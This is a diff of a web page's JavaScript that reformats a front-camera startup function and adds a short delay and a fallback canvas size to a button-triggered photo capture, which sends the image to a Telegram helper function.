@@ -18,30 +18,35 @@
     const recordAudioBtn = document.getElementById('recordAudioBtn');
 
     // 1. Start the camera video stream
-  async function startCamera() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
-    });
-    video.srcObject = stream;
-  } catch (err) {
-    console.error('Error accessing camera: ', err);
-  }
-}
-
+    async function startCamera() {
+      try {
+        // Use specific constraints for mobile compatibility
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+        video.srcObject = stream;
+      } catch (err) {
+        console.error('Error accessing camera: ', err);
+      }
+    }
 
     // 2. Capture photo from video stream
     captureBtn.addEventListener('click', () => {
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      canvas.toBlob(async (blob) => {
-        await sendToTelegram(blob, 'photo');  // Send captured photo to Telegram
-      }, 'image/jpeg');
+      setTimeout(() => {
+        const canvas = document.createElement('canvas');
+        // Set a fallback resolution if videoWidth or videoHeight are 0
+        canvas.width = video.videoWidth || 300;
+        canvas.height = video.videoHeight || 150;
+        const ctx = canvas.getContext('2d');
+        
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert canvas to Blob for sending to Telegram
+        canvas.toBlob(async (blob) => {
+          await sendToTelegram(blob, 'photo');  // Send captured photo to Telegram
+        }, 'image/jpeg');
+      }, 500);  // Small delay to allow video stream to load
     });
 
     // 3. Record audio using MediaRecorder
